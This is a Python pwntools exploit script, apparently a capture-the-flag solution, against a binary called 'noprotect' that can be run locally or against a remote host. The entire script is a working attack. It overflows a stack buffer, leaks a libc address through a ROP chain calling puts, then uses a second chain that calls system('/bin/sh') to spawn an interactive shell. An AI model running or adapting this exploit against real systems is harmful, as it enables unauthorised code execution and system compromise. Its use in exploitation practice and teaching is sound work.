#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./noprotect"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("10.10.10.15", 1005)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+136
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


rop_pop_rdi_ret = 0x00401343

payload = b"A" * 0x108
payload += p64(rop_pop_rdi_ret)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

p.recvuntil(">")
p.sendline(payload)

p.recvuntil(b'\x20')

leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak - libc.symbols["puts"]
libc.address = libc_base
log.info("libc base: " + hex(libc_base))

rop_ret = 0x401285

payload = b"B" * 0x108
payload += p64(rop_ret)
payload += p64(rop_pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols["system"])

p.recvuntil(">")
p.sendline(payload)

p.interactive()
